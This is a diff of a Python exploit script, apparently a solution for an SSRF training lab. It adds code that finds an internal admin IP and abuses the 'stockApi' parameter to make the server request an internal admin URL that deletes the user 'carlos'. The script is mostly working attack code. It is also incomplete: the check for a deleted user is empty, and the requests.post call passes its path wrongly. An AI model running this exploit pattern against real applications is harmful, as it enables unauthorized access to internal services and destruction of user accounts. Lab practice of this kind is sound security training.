@@ -16,6 +16,20 @@ def check_admin_hostname(url):
             admin_ip_address = '192.168.0.%s' %i
             break
 
+    if admin_ip_address == '':
+        print("(-) Could not find admin hostname")
+    return admin_ip_address
+
+def delete_user(url, admin_ip_address):
+    delete_user_url_ssrf_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
+    check_stock_path = 'product/stock'
+    param = {'stockApi': delete_user_url_ssrf_payload}
+    r = requests.post(url, check_stock_path, data=param, verify=False, proxies=proxies)
+
+    # Check if user was deleleted
+    
+
+
 def main():
     if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
@@ -23,7 +37,10 @@ def main():
 
     url = sys.argv[1]
     print("(+) Finding admin hostname...")
-    admin_hostname = check_admin_hostname(url)
-    # not complete
+    admin_ip_address = check_admin_hostname(url)
+    print("(+) Found the admin ip address: %s" % admin_ip_address)
+    print("(-) Deleting Carlos user...")
+    delete_user(url, admin_ip_address)
+
 if __name__ == "__main__":
     main()
